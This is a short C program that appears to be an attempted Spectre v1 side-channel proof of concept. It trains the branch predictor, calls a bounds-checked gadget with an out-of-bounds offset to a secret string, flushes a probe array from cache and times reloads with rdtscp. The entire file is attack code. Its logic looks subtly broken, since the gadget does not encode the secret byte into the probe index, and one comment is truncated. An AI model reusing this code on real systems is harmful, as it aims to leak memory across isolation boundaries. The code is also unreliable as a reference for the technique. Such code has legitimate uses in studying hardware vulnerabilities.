
//flush array from cache
//cheat branch predictor
//supply random number to chea
#include <stdio.h>
#include <string.h>
#include <x86intrin.h>
#define array_size 15
unsigned int threashold=80;
char *secret="hello there how are you";

unsigned int array[128 * 4096];

unsigned int temp;

void vuln(unsigned int x){
	if(x<array_size)
		temp &= array[x*4096];
}

void Read_memory(int size,int index){
	int i,j;
	register int time1;
	register int time2;
	for(i=0;i<128;i++){ 
		_mm_clflush(&array[i *4096]);	//flushing the array from cache
	}
	unsigned int a;

	for(i=0;i<size;i++){
		for(j=0;j<14;j++){
			if(i%6==0){
				vuln(index);
			}
			else{
				vuln(6);
				
			}
		}
	}

	array[46*4096]=0xFF;
	int mix_i;
	int *addr;
	
	unsigned int junk;
	for(i=0;i<128;i++){
		//mix_i = ((i * 167) + 13) & 255;
		addr=&array[i*4096];
		time1=__rdtscp(&junk);
		junk=*addr;
		time2=__rdtscp(&junk)-time1;
		printf("%d\n",time2);
	
	}
}

int main(){
	int size=strlen(secret);
	long int position;
	position=secret-(char*)array;
	Read_memory(size,position);
}